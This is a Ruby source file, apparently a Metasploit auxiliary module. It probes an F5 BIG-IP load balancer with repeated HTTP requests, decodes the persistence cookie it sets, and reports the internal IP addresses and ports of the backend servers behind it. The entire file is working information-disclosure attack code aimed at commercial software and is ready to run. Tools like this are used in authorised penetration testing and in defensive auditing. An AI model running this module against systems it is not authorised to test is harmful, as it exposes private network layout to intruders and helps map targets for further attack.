##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'F5 Bigip Backend IP/PORT Cookie Disclosure.',
      'Description'    => %q{
          This module identify F5 BigIP SLB and decode sticky cookies which leak
        backend IP and port.
      },
      'Author'         => [ 'Thanat0s <thanspam[at]trollprod.org>' ],
      'References'     =>
        [
          ['URL', 'http://support.f5.com/kb/en-us/solutions/public/6000/900/sol6917.html'],
          ['URL', 'http://support.f5.com/kb/en-us/solutions/public/7000/700/sol7784.html?sr=14607726']
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI path to test', '/']),
        OptInt.new('RETRY', [true, 'Number of requests to try to find backends', 10])
      ], self.class)
  end

  def cookie_decode(cookie_value)
    m = cookie_value.match(/(\d+)\.(\d+)\./)
    host = (m.nil?) ? nil : m[1]
    port = (m.nil?) ? nil : m[2]
    port = (("%04X" % port).slice(2,4) << ("%04X" % port).slice(0,2)).hex.to_s
    byte1 =  ("%08X" % host).slice(6..7).hex.to_s
    byte2 =  ("%08X" % host).slice(4..5).hex.to_s
    byte3 =  ("%08X" % host).slice(2..3).hex.to_s
    byte4 =  ("%08X" % host).slice(0..1).hex.to_s
    host = byte1 << "." << byte2 << "." << byte3 << "." << byte4
    return host,port
  end

  def get_cookie # request a page and extract a F5 looking cookie.
    res = send_request_raw({
      'method' => 'GET',
      'uri'    => @uri
    })
    
    id,value = nil
    begin
      # Get the SLB session ID, like "TestCookie=2263487148.3013.0000"
      m = res.get_cookies.match(/([\-\w\d]+)=((?:\d+\.){2}\d+)(?:$|,|;|\s)/)
    ensure
      id = (m.nil?) ? nil : m[1]
      value = (m.nil?) ? nil : m[2]
    return id, value
    end
  end

  def run
    host_port = Hash.new
    @uri = normalize_uri(target_uri.path)
    print_status("Starting request #{@uri}")
    id, value = get_cookie()
    unless id
      print_error "F5 SLB cookie not found"
      return
    end
    print_status ("F5 cookie \"#{id}\" found")
    host, port = cookie_decode(value)
    host_port[host+":"+port] = true
    print_status "Backend #{host}:#{port}"
    i=1 # We already have done one request
    until i == datastore['RETRY']
      id, value = get_cookie()
      host, port = cookie_decode(value)
      if ! host_port.has_key? host+":"+port
        host_port[host+":"+port] = true
        print_status "Backend #{host}:#{port}"
      end
      i += 1
    end
    # Reporting found backend in database
    backends = Array.new
    host_port.each do |key, value|
      backends.push key
    end
    report_note(
             :host => datastore['RHOST'],
             :type => "F5_Cookie_Backends",
             :data => backends
            )
  end
end
